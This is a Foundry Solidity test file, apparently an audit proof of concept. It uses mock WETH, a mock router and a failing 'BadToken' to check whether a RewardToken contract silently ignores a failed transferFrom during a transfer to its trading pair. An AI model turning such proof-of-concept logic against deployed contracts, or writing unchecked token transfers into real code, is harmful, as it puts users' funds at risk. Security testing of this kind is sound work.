// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/honeybee.sol";

contract MockWETH is IERC20 {
    string public name = "WETH";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    receive() external payable { 
        balanceOf[msg.sender] += msg.value;
    }
    
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    
    function totalSupply() external view override returns (uint256) {
        return address(this).balance;
    }
}

contract BadToken is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    bool public shouldFail = false;

    function setBalance(address account, uint256 amount) public {
        balanceOf[account] = amount;
    }

    function setShouldFail(bool _shouldFail) public {
        shouldFail = _shouldFail;
    }

    function transferFrom(address, address, uint256) external override returns (bool) {
        return !shouldFail;
    }

    function transfer(address, uint256) external pure override returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure override returns (bool) {
        return true;
    }

    function totalSupply() external pure override returns (uint256) {
        return type(uint256).max;
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(uint160(uint256(keccak256("mock pair"))));
    }
}

contract MockRouter {
    address public immutable factory;
    MockWETH public immutable WETH;
    
    constructor(MockWETH _weth) {
        factory = address(new MockFactory());
        WETH = _weth;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure {}
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure {}

    function addLiquidity(
        address, address, uint256, uint256, uint256, uint256, address, uint256
    ) external pure returns (uint256, uint256, uint256) { 
        return (0,0,0); 
    }

    function addLiquidityETH(
        address, uint256, uint256, uint256, address, uint256
    ) external payable returns (uint256, uint256, uint256) {
        return (0,0,0);
    }

    function removeLiquidity(
        address, address, uint256, uint256, uint256, address, uint256
    ) external pure returns (uint256, uint256) { 
        return (0,0); 
    }

    function removeLiquidityETH(
        address, uint256, uint256, uint256, address, uint256
    ) external pure returns (uint256, uint256) {
        return (0,0);
    }

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address, uint256, uint256, uint256, address, uint256
    ) external pure returns (uint256) { 
        return 0; 
    }

    function removeLiquidityETHWithPermit(
        address, uint256, uint256, uint256, address, uint256, bool, uint8, bytes32, bytes32
    ) external pure returns (uint256, uint256) {
        return (0,0);
    }

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address, uint256, uint256, uint256, address, uint256, bool, uint8, bytes32, bytes32
    ) external pure returns (uint256) {
        return 0;
    }

    function removeLiquidityWithPermit(
        address, address, uint256, uint256, uint256, address, uint256, bool, uint8, bytes32, bytes32
    ) external pure returns (uint256, uint256) {
        return (0,0);
    }

    function swapExactETHForTokens(
        uint256, address[] calldata, address, uint256
    ) external payable returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256, address[] calldata, address, uint256
    ) external payable {}

    function swapExactTokensForETH(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function swapExactTokensForTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function swapETHForExactTokens(
        uint256, address[] calldata, address, uint256
    ) external payable returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function swapTokensForExactETH(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function swapTokensForExactTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function quote(uint256, uint256, uint256) external pure returns (uint256) { 
        return 0; 
    }

    function getAmountOut(uint256, uint256, uint256) external pure returns (uint256) { 
        return 0; 
    }

    function getAmountIn(uint256, uint256, uint256) external pure returns (uint256) { 
        return 0; 
    }

    function getAmountsOut(uint256, address[] calldata) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }

    function getAmountsIn(uint256, address[] calldata) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        return amounts;
    }
}

contract RewardTokenTest is Test {
    RewardToken token;
    BadToken public rewardToken;
    BadToken public distributeRewardToken;
    MockRouter router;
    MockWETH public mockWETH;
    address public teamWallet;
    address public feeWallet = address(0x10);
    address public user = address(0x11);
    address public fakePair = address(0x555);
    address public distributor = address(0x222);
    address public partner = address(0x333);
    
    receive() external payable {}

    function setUp() public {
        // Create tokens
        mockWETH = new MockWETH();
        rewardToken = new BadToken();
        distributeRewardToken = new BadToken();
        router = new MockRouter(mockWETH);
        
        // Create token configs
        address[] memory rewardTokens = new address[](2);
        rewardTokens[0] = address(rewardToken);
        rewardTokens[1] = address(distributeRewardToken);

        uint256[] memory fees = new uint256[](5);
        fees[0] = 1;    // liquidityFee
        fees[1] = 2;    // marketingFee
        fees[2] = 3;    // level1
        fees[3] = 4;    // level2
        fees[4] = 5;    // extraSellFee

        // Simulate ETH for deployment
        vm.deal(address(this), 1 ether);
        
        // Deploy token with test ETH
        token = new RewardToken{value: 1 ether}(
            "TestToken",
            "TEST",
            1_000_000 ether,   // 1M tokens
            18,
            rewardTokens,
            5,      // rewardsFee
            100,    // min tokens
            fees,
            address(router),
            address(this)     // ownership address
        );
        
        teamWallet = address(this);

        // Configure token
        token.setDistributor(distributor, partner);
        token.setTrading(true);
        address[] memory wallets = new address[](1);
        wallets[0] = feeWallet;
        token.setFeeWallets(wallets);
        token.setAutomatedMarketMakerPair(fakePair, true);

        // Fund token contract
        token.transfer(address(token), token.swapTokensAtAmount() * 2);
    }

    function testUncheckedTransferFrom() public {
        // Fund the teamWallet with distributeReward tokens and approve
        distributeRewardToken.setBalance(teamWallet, 1000 ether);
        distributeRewardToken.approve(address(token), 1000 ether);
        
        console.log("--- BEFORE-Trigger ---");
        console.log("DistributeRewardToken transferFrom will fail but should be ignored");
        
        console.log("--- Trigger Exploit ---");
        // Make distributeRewardToken transfers fail
        distributeRewardToken.setShouldFail(true);
        
        // Perform initial transfer to user (should succeed)
        token.transfer(user, 1000 ether);
        
        // Get amount for vulnerability trigger
        uint256 transferAmount = token.swapTokensAtAmount() * 2;
        console.log("Transfer amount to fake pair:", transferAmount);
        
        console.log("--- Vulnerability Trigger ---");
        bool hasReverted;
        // Use low-level call to check for revert
        vm.startPrank(user);
        (bool success, ) = address(token).call(
            abi.encodeWithSelector(
                token.transfer.selector, 
                fakePair, 
                transferAmount
            )
        );
        vm.stopPrank();
        hasReverted = !success;
        
        console.log("--- AFTER-Verification ---");
        console.log("Transfer without revert:", success);
        
        // Final verdict
        if (success) {
            console.log("Vulnerability Exists: Transfer completed without reverting despite failed call to distributeRewardToken");
        } else {
            console.log("Vulnerability not Exist: Transfer reverted when reward token transfer failed");
        }
    }
}